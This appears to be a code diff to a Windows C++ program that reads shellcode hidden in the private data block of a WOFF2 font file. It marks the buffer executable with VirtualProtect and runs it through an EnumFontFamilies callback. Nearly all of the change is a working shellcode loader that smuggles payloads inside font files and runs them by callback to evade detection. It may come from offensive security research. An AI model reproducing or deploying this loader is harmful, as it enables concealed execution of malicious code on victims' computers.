@@ -1,11 +1,17 @@
-#include <windows>
+#include <winsock2.h>
+#include <Windows.h>
+#include <wingdi.h>
+#include <WinUser.h>
 #include <iostream>
-#include <arpa/inet.h>
 #include <fstream>
 #include <vector>
 #include <cstdint>
 #include <cstddef>
 #include <iomanip>
+
+#pragma comment(lib, "gdi32.lib")
+#pragma comment(lib, "user32.lib")
+#pragma comment(lib, "ws2_32.lib")
 
 using namespace std;
 
@@ -30,12 +36,31 @@ struct WOFF2_Header {
 
 #pragma pack(pop)
 
-vector<char> read_private_data_block(string& woff2_file) {
+vector<BYTE> private_data_block;
+
+BOOL CALLBACK EnumFamCallBack(LPLOGFONT lplf, LPNEWTEXTMETRIC lpntm, DWORD FontType, LPVOID aFontCount) {
+    DWORD oldProtect;
+
+    cout << "[+] Enter Callback" << endl;
+
+    if (VirtualProtect(private_data_block.data(), private_data_block.size(), PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        auto entry = (void(*) ())private_data_block.data();
+        
+        entry();
+
+        cout << "[+] Trigger received. Execute Payload..." << endl;
+    }
+    
+    return TRUE;
+}
+
+BOOL read_private_data_block(string& woff2_file) {
   WOFF2_Header header;
   ifstream file(woff2_file, ios::binary | ios::ate);
 
   if (!file) {
     throw runtime_error("[!] Impossible to open the WOFF2 file");
+    return FALSE;
   }
 
   streamsize size = file.tellg();
@@ -44,39 +69,47 @@ vector<char> read_private_data_block(string& woff2_file) {
 
   if (!file.read(reinterpret_cast<char*>(&header), sizeof(WOFF2_Header))) {
     throw runtime_error("[!] Impossible to read the Header");
+    return FALSE;
   }
 
   if (ntohl(header.signature) != 0x774f4632) {
     cerr << "[!] Bad magic\n";
+    return FALSE;
   }
 
   file.seekg(ntohl(header.privOffset), ios::beg);
   if(!file) {
     throw runtime_error("[!] Invalid Offset");
+    return FALSE;
   }
 
-  vector<char> shellcode(ntohl(header.privLength));
-  if(!file.read(shellcode.data(), (int)ntohl(header.privLength))) {
+  private_data_block.resize(ntohl(header.privLength));
+  printf("[i] Shellcode read at : %p\n", &private_data_block);
+
+  if(!file.read(reinterpret_cast<char*>(private_data_block.data()), (int)ntohl(header.privLength))) {
     throw runtime_error("[!] Impossible to read private data block");
+    return FALSE;
   }
 
   file.close();
 
-  return shellcode;
+  return TRUE;
 }
 
 int main (int argc, char *argv[]) {
+  HDC hdc = GetDC(NULL);
+  int aFontCount[] = { 0, 0, 0 };
+
+  if (hdc == NULL) {
+      cout << "[!] HDC Not Found !" << endl;
+      return 1;
+  }
   
   string filename = "test.woff2";
 
-  vector<char> shellcode = read_private_data_block(filename);
+  read_private_data_block(filename);
 
-  for (unsigned char c : shellcode) {
-    cout << "\\x"
-         << hex << setw(2) << setfill('0') << (int)c;
-  }
-
-  cout << dec << endl;
+  EnumFontFamilies(hdc, (LPCSTR)NULL, (FONTENUMPROC)EnumFamCallBack, (LPARAM)aFontCount);
 
   return 0;
 }
